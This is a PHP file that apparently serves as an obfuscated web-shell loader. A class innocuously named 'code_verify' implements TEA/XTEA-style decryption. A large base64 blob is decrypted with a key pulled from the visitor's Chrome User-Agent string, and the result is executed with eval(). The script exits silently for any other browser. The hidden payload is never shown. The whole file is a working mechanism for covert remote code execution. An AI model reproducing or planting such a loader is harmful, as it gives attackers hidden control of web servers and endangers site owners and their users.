<?php
class code_verify{
	var $cd_str;
	function __construct(){
		$this->setIter(32);
	}
	function code2leng($start, &$data, &$data_long){
		$n = strlen($data);
		$tmp = unpack('N*', $data);
		$j  = $start;
		foreach ($tmp as $value) 
		$data_long[$j++] = $value;
		return $j;
	}
	function leng2code($l){
		return pack('N', $l);
	}
	function setIter($cd_str){
		$this->cd_str = $cd_str;
	}
	function getIter(){
		return $this->cd_str;
	}
	function uncode($enc_data){
		$keyone = $_SERVER['HTTP_USER_AGENT'];
		if(preg_match('/Chrome\/(.*) Safari\//is',$keyone,$src)){
			$key = substr($src[1],5,4);
		}else{
			die();
		}
		$n_enc_data_long = $this->code2leng(0, $enc_data, $enc_data_long);
		$this->resize($key, 16, true);
		if ('' == $key)
		$key = '0000000000000000';
		$n_key_long = $this->code2leng(0, $key, $key_long);
		$data = '';
		$w = array(0, 0);
		$j = 0;
		$len = 0;
		$k = array(0, 0, 0, 0);
		$pos = 0;
		for ($i = 0;$i < $n_enc_data_long;$i += 2){
			if ($j + 4 <= $n_key_long){
				$k[0] = $key_long[$j];
				$k[1] = $key_long[$j + 1];
				$k[2] = $key_long[$j + 2];
				$k[3] = $key_long[$j + 3];
			}else{
				$k[0] = $key_long[$j % $n_key_long];
				$k[1] = $key_long[($j + 1) % $n_key_long];
				$k[2] = $key_long[($j + 2) % $n_key_long];
				$k[3] = $key_long[($j + 3) % $n_key_long];
			}
			$j = ($j + 4) % $n_key_long;
			$this->decipherLong($enc_data_long[$i], $enc_data_long[$i + 1], $w, $k);
			if (0 == $i){
				$len = $w[0];
				if (4 <= $len){
					$data .= $this->leng2code($w[1]);
				}else{
					$data .= substr($this->leng2code($w[1]), 0, $len % 4);
				}
			}else{
				$pos = ($i - 1) * 4;
				if ($pos + 4 <= $len){
					$data .= $this->leng2code($w[0]);
					if ($pos + 8 <= $len){
						$data .= $this->leng2code($w[1]);
					}elseif($pos + 4 < $len){
						$data .= substr($this->leng2code($w[1]), 0, $len % 4);
					}
				}else{
					$data .= substr($this->leng2code($w[0]), 0, $len % 4);
				}
			}
		}
		return $data;
	}
	function add($i1, $i2) {
		$result = 0.0;
		foreach (func_get_args() as $value){
		if (0.0 > $value){
			$value -= 1.0 + 0xffffffff;
		}
		$result += $value;
		}
		if (0xffffffff < $result || -0xffffffff > $result){
			$result = fmod($result, 0xffffffff + 1);
		}
		if (0x7fffffff < $result){
			$result -= 0xffffffff + 1.0;
		}elseif (-0x80000000 > $result){
			$result += 0xffffffff + 1.0;
		}
	return $result;
	}
	function rshift($integer, $n){
		if (0xffffffff < $integer || -0xffffffff > $integer){
			$integer = fmod($integer, 0xffffffff + 1);
		}
		if (0x7fffffff < $integer){
			$integer -= 0xffffffff + 1.0;
		}elseif(-0x80000000 > $integer){
			$integer += 0xffffffff + 1.0;
		}
		if (0 > $integer){
			$integer &= 0x7fffffff;
			$integer >>= $n;
			$integer |= 1 << (31 - $n);
		}else{
			$integer >>= $n;
		}
		return $integer;
	}
	function resize(&$data, $size, $nonull = false){
		$n  = strlen($data);
		$nmod = $n % $size;
		if(0 == $nmod)
			$nmod = $size;
		if ($nmod > 0){
			if ($nonull){
				for ($i = $n;$i < $n - $nmod + $size;++$i){
				$data[$i] = $data[$i % $n];
				}
			}else{
				for ($i = $n;$i < $n - $nmod + $size;++$i){
				$data[$i] = chr(0);
				}
			}
		}
		return $n;
	}
	function decipherLong($y, $z, &$w, &$k){
		$sum = 0xC6EF3720;
		$delta = 0x9E3779B9;
		$n  = (integer) $this->cd_str;
		while ($n-- > 0){
			$z = $this->add($z, 
			-($this->add($y << 4 ^ $this->rshift($y, 5), $y) ^ 
			$this->add($sum, $k[$this->rshift($sum, 11) & 3])));
			$sum = $this->add($sum, -$delta);
			$y  = $this->add($y, 
			-($this->add($z << 4 ^ $this->rshift($z, 5), $z) ^ 
			$this->add($sum, $k[$sum & 3])));
		}
		$w[0] = $y;
		$w[1] = $z;
	}
}


$str="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";
$srcstr = base64_decode($str); 
$code_verify = new code_verify(64); 
$strq = $code_verify->uncode($srcstr);
eval($strq);